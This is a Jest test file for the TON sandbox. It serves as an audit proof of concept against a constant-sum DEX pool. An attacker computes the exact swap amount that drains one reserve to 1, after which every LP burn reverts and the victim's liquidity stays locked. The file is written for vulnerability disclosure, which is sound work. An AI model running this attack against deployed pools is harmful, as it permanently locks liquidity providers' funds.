import { compile } from '@ton/blueprint';
import { toNano } from '@ton/core';
import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import '@ton/test-utils';
import 'dotenv/config';
import { preprocBuildContractsLocal } from '../helpers/helpers';
import {
    buildLibFromCell,
    buildLibs,
    DEFAULT_JETTON_MINTER_CODE,
    DEFAULT_JETTON_WALLET_CODE,
    getWalletBalance,
    JettonMinterContract,
    metadataCell,
    onchainMetadata,
} from '../libs';
import { expectNotBounced, getWalletContract, SLIM_CONFIG_LEGACY } from '../libs/src/test-helpers';
import { LPWallet } from '../wrappers/LPWallet';
import { PoolCSI } from '../wrappers/Pool';
import { Router, provideLpPayload, swapPayload } from '../wrappers/Router';



const logSection = (title: string) => {
    process.stdout.write(`\n=== ${title} ===\n`);
};

const logKV = (key: string, value: unknown) => {
    process.stdout.write(`${key.padEnd(25)} : ${value}\n`);
};

const fmt = (n: bigint): string => {
    const whole = n / 1_000_000_000n;
    const frac  = n % 1_000_000_000n;
    return `${whole}.${frac.toString().padStart(9, '0')}`;
};



const HOUR_IN_SECONDS  = 3600;
const INITIAL_LIQUIDITY = toNano('100000');
const PHANTOM_LP        = 1001n;
const FEE_DIV           = 10000n;
const BURN_AMOUNTS      = 4; // number of burn attempts in proof



describe('ConstantSum LP Lock Audit PoC', () => {

    let bc:        Blockchain;
    let deployer:  SandboxContract<TreasuryContract>;
    let attacker:  SandboxContract<TreasuryContract>;
    let victim:    SandboxContract<TreasuryContract>;
    let router:    SandboxContract<Router>;
    let token0:    SandboxContract<JettonMinterContract>;
    let token1:    SandboxContract<JettonMinterContract>;
    let pool:      SandboxContract<PoolCSI>;
    let initTimestamp: number;

    beforeAll(async () => {
        // protocol_fee = 0 required for clean single-step drain to reserve = 1.
        // protocol_fee = 0 is a valid config: params::min_fee = 0 in common/params.fc.
        // With protocol_fee > 0, minimum stable reserve = 2 instead of 1,
        // but the lock still applies to holders with lp < total_supply / 2.
        preprocBuildContractsLocal({
            dexType:           'constant_sum',
            defaultIsLocked:   null, // null → "0" → pool deploys unlocked
            defaultLPFee:      null, // null → "20" → 0.2%
            defaultProtocolFee: 0,   // 0 → clean drain, no ceiling-rounding overshoot
        });

        const _code = {
            router:    await compile('Router'),
            lpAccount: await compile('LPAccount'),
            lpWallet:  await compile('LPWallet'),
            pool:      await compile('Pool'),
            vault:     await compile('Vault'),
            poolDummy: await compile('PoolDummy'),
        };

        const myLibs = buildLibs(_code);
        const code = {
            router:    buildLibFromCell(_code.router,    'build/router.json'),
            lpWallet:  buildLibFromCell(_code.lpWallet,  'build/lpWallet.json'),
            lpAccount: buildLibFromCell(_code.lpAccount, 'build/lpAccount.json'),
            pool:      buildLibFromCell(_code.pool,      'build/pool.json'),
            vault:     buildLibFromCell(_code.vault,     'build/vault.json'),
            poolDummy: buildLibFromCell(_code.poolDummy, 'build/poolDummy.json'),
        };

        bc = await Blockchain.create({ config: SLIM_CONFIG_LEGACY });
        if (myLibs) bc.libs = myLibs;

        initTimestamp = Math.floor(Date.now() / 1000);
        bc.now = initTimestamp;

        deployer = await bc.treasury('deployer');
        attacker = await bc.treasury('attacker');
        victim   = await bc.treasury('victim');

        router = bc.openContract(Router.createFromConfig({
            isLocked:     false,
            adminAddress: deployer.address,
            lpWalletCode:  code.lpWallet,
            poolCode:      code.pool,
            lpAccountCode: code.lpAccount,
            vaultCode:     code.vault,
        }, code.router));
        expectNotBounced((await router.sendDeploy(deployer.getSender(), toNano('1'))).events);

        const deployJetton = async (name: string) => {
            const m = bc.openContract(JettonMinterContract.createFromConfig({
                totalSupply: 0,
                adminAddress: deployer.address,
                content: metadataCell(onchainMetadata({ name })),
                jettonWalletCode: DEFAULT_JETTON_WALLET_CODE,
            }, DEFAULT_JETTON_MINTER_CODE));
            try { await m.getJettonData(); } catch {
                await m.sendDeploy(deployer.getSender(), toNano('0.05'));
            }
            return m;
        };

        token0 = await deployJetton('TOKEN0');
        token1 = await deployJetton('TOKEN1');

        const mint = async (
            token: SandboxContract<JettonMinterContract>,
            to:    SandboxContract<TreasuryContract>,
        ) => {
            expectNotBounced((await token.sendMint(deployer.getSender(), {
                value:    toNano(2),
                toAddress: to.address,
                fwdAmount: toNano(1),
                masterMsg: {
                    jettonAmount:       toNano(10_000_000),
                    jettonMinterAddress: token.address,
                    responseAddress:    to.address,
                },
            })).events);
        };

        for (const user of [deployer, attacker, victim]) {
            await mint(token0, user);
            await mint(token1, user);
        }
    });

    it('reserve1 = 1 makes all LP burns permanently revert', async () => {

        const rw0 = await getWalletContract(bc, token0, router.address);
        const rw1 = await getWalletContract(bc, token1, router.address);



        // Deposit token0 (no mint yet)
        expectNotBounced((await (await getWalletContract(bc, token0, victim.address))
            .sendTransfer(victim.getSender(), {
                value: toNano(2), jettonAmount: INITIAL_LIQUIDITY,
                toAddress: router.address, responseAddress: victim.address,
                fwdAmount: toNano(1),
                fwdPayload: provideLpPayload({
                    otherTokenAddress: rw1.address,
                    minLpOut: 0n, refundAddress: victim.address,
                    excessesAddress: victim.address, toAddress: victim.address,
                    deadline: initTimestamp + HOUR_IN_SECONDS,
                }),
            })).events);

        pool = bc.openContract(PoolCSI.createFromAddress(
            await router.getPoolAddress({
                firstWalletAddress:  rw0.address,
                secondWalletAddress: rw1.address,
            })
        ));
        await pool.sendDeploy(victim.getSender(), toNano(1));

        // Deposit token1 (triggers LP mint)
        expectNotBounced((await (await getWalletContract(bc, token1, victim.address))
            .sendTransfer(victim.getSender(), {
                value: toNano(2), jettonAmount: INITIAL_LIQUIDITY,
                toAddress: router.address, responseAddress: victim.address,
                fwdAmount: toNano(1),
                fwdPayload: provideLpPayload({
                    otherTokenAddress: rw0.address,
                    minLpOut: 1n, refundAddress: victim.address,
                    excessesAddress: victim.address, toAddress: victim.address,
                    deadline: initTimestamp + HOUR_IN_SECONDS,
                }),
            })).events);

        const initial = await pool.getPoolData();
        logSection('Initial State');
        logKV('reserve0',       fmt(initial.leftReserve));
        logKV('reserve1',       fmt(initial.rightReserve));
        logKV('total_lp_supply', fmt(initial.totalSupplyLP));
        logKV('is_locked',      initial.isLocked);

        // Pre-conditions
        expect(initial.leftReserve).toBeGreaterThan(0n);
        expect(initial.rightReserve).toBeGreaterThan(0n);
        expect(initial.totalSupplyLP).toBeGreaterThan(0n);
        expect(initial.isLocked).toBe(false);



        const victimLpWallet = bc.openContract(
            LPWallet.createFromAddress(await pool.getWalletAddress(victim.address))
        );
        const lpBefore = await getWalletBalance(victimLpWallet);

        // Confirm burn works, proves the lock is introduced by the attack, not pre-existing
        expectNotBounced((await victimLpWallet.sendBurnExt(victim.getSender(), {
            jettonAmount: 1n,
        }, toNano(1))).events);

        const lpAfterTestBurn = await getWalletBalance(victimLpWallet);
        expect(lpAfterTestBurn).toEqual(lpBefore - 1n);

        logSection('Pre-attack Validation');
        logKV('victim_lp_balance',  fmt(lpBefore));
        logKV('burn_1_lp_result',   'SUCCESS (expected)');



        const state    = await pool.getPoolData();
        const reserve1 = state.rightReserve;
        const lpFee    = state.lpFee;

        // Determine which token maps to rightReserve (reserve1)
        const rightIsRw1    = state.rightJettonAddress.equals(rw1.address);
        const tokenIn       = rightIsRw1 ? token0 : token1;
        const tokenOutWallet = rightIsRw1 ? rw1.address : rw0.address;

        // Ceiling division: amount_in = ceil((reserve1 - 1) * FEE_DIV / (FEE_DIV - lpFee))
        const targetBaseOut  = reserve1 - 1n;
        const attackAmount   = (targetBaseOut * FEE_DIV + (FEE_DIV - lpFee) - 1n) / (FEE_DIV - lpFee);

        logSection('Attack execution');
        logKV('reserve1_before',   fmt(reserve1));
        logKV('lp_fee_bps',        lpFee.toString());
        logKV('protocol_fee_bps',  state.protocolFee.toString());
        logKV('attack_amount_in',  fmt(attackAmount));

        expectNotBounced((await (await getWalletContract(bc, tokenIn, attacker.address))
            .sendTransfer(attacker.getSender(), {
                value: toNano(2), jettonAmount: attackAmount,
                toAddress: router.address, responseAddress: attacker.address,
                fwdAmount: toNano(1),
                fwdPayload: swapPayload({
                    otherTokenWallet: tokenOutWallet,
                    receiver:         attacker.address,
                    minOut:           0n,
                    refundAddress:    attacker.address,
                    excessesAddress:  attacker.address,
                    deadline:         initTimestamp + HOUR_IN_SECONDS,
                }),
            })).events);

        const stateAfterAttack = await pool.getPoolData();
        logKV('reserve1_after',    stateAfterAttack.rightReserve.toString());

        // ASSERTION: reserve1 is exactly 1
        expect(stateAfterAttack.rightReserve).toEqual(1n);
        


        const totalSupply = stateAfterAttack.totalSupplyLP;
        const maxBurnable = totalSupply - PHANTOM_LP;           // max any holder can own
        const floorResult = maxBurnable * 1n / totalSupply;    // integer division collapse

        logSection('Invarian check');
        logKV('total_lp_supply',   fmt(totalSupply));
        logKV('phantom_lp_locked', PHANTOM_LP.toString());
        logKV('max_lp_any_holder', fmt(maxBurnable));
        logKV('floor(max/total)',  floorResult.toString());

        // Machine-verifiable proof of the collapse
        expect(maxBurnable).toBeLessThan(totalSupply);         // no holder can own full supply
        expect(floorResult).toEqual(0n);                       // integer division always yields 0
        // Therefore amount1_out = 0 for every possible burn → burn guard always fails



        const lpBalance  = await getWalletBalance(victimLpWallet);
        const burnAmountsList = [1n, 1000n, lpBalance / 2n, lpBalance];
        let failedBurns = 0;

        for (const amount of burnAmountsList) {
            if (amount <= 0n) continue;

            await victimLpWallet.sendBurnExt(victim.getSender(), {
                jettonAmount: amount,
            }, toNano(1));

            const lpAfter = await getWalletBalance(victimLpWallet);

            // on_bounce restores balance → LP unchanged means burn reverted
            if (lpAfter === lpBalance) failedBurns++;

            // Machine-verifiable: balance must be exactly restored
            expect(lpAfter).toEqual(lpBalance);
        }

        logSection('Burn validation');
        logKV('victim_lp_balance',    fmt(lpBalance));
        logKV('burn_amounts_tested',  burnAmountsList.map(a => fmt(a)).join(', '));
        logKV('burns_failed',         `${failedBurns}/${BURN_AMOUNTS}`);

        expect(failedBurns).toEqual(BURN_AMOUNTS);



        const finalState = await pool.getPoolData();

        // reserve1 unchanged  no automatic recovery occurred
        expect(finalState.rightReserve).toEqual(1n);

        const attackFeePaid = attackAmount * lpFee / FEE_DIV;
        const valueLocked   = finalState.leftReserve;
        const attackRatio   = Number(attackFeePaid * 10000n / valueLocked) / 100;

        logSection('Final State');
        logKV('reserve0_locked',   fmt(valueLocked));
        logKV('reserve1',          finalState.rightReserve.toString());
        logKV('total_lp_supply',   fmt(finalState.totalSupplyLP));
        logKV('attack_fee_paid',   fmt(attackFeePaid));
        logKV('attack_cost_%',     `${attackRatio.toFixed(4)}% of locked value`);

        logSection('Proof conditions');
        logKV('lp_redeemable',              false);
        logKV('automatic_recovery_exists',  false);
        logKV('admin_rescue_exists',        false);
        logKV('alternate_burn_path_exists', false);
        logKV('state_is_recoverable',       false);

        // Final machine-verifiable assertions
        expect(finalState.rightReserve).toEqual(1n);            // lock persists
        expect(finalState.leftReserve).toBeGreaterThan(0n);     // funds are present but locked
        expect(finalState.totalSupplyLP).toBeGreaterThan(0n);   // LP tokens exist but cannot be burned
    });
});
